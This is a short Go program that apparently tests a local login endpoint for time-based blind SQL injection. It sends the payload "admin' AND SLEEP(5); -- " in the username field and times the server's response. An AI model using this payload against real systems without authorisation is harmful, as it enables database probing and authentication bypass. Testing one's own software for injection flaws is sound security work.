package main

import (
	"net/url"
	_"bytes"
	"fmt"
	"io/ioutil"
	"net/http"
	"time"
)

func main() {
	// Define the URL
	endpoint := "http://localhost:8080/login"
	
	// Create form data with SQL injection
	formData := url.Values{
		"username": {"admin' AND SLEEP(5); -- "},
		"password": {""},
	}

	// Measure the time taken for the request
	start := time.Now()
	response, err := http.PostForm(endpoint, formData)
	elapsed := time.Since(start)

	if err != nil {
		fmt.Printf("Request failed: %v\n", err)
		return
	}
	defer response.Body.Close()

	body, err := ioutil.ReadAll(response.Body)
	if err != nil {
		fmt.Printf("Failed to read response body: %v\n", err)
		return
	}

	fmt.Printf("Response: %s\n", body)
	fmt.Printf("Request took: %v\n", elapsed)
}

